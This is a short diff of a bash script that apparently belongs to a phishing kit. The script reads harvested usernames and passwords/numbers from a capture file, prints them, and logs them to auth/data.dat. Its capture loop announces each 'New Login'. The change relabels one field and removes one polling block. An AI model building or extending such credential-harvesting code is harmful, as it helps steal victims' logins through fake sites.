@@ -330,7 +330,7 @@ Name=$(grep -o 'Username:.*' .server/www/data.txt | awk -F ":." '{print  $NF}')
 Number=$(grep -o 'Number:.*' .server/www/data.txt | awk -F ":." '{print  $NF}')
 IFS=$'\n'
 	echo -e "\n${WHITE}Username  :   ${BLUE}$Name"
-	echo -e "\n${WHITE}Password  :   ${BLUE}$Number"
+	echo -e "\n${WHITE}Number    :   ${BLUE}$Number"
     cat .server/www/data.txt >> auth/data.dat
 }
 
@@ -352,12 +352,6 @@ capture_data() {
 			echo -e "\n${GREEN}[${WHITE}!${GREEN}] New Login !${WHITE} ~"
 			meta
 			rm -rf .server/www/usernames.txt
-		fi
-		sleep 0.75
-				if [[ -e ".server/www/data.txt" ]]; then
-			echo -e "\n${GREEN}[${WHITE}!${GREEN}] New Login !${WHITE} ~"
-			data
-			rm -rf .server/www/data.txt
 		fi
 		sleep 0.75
 				if [[ -e ".server/www/cod.txt" ]]; then
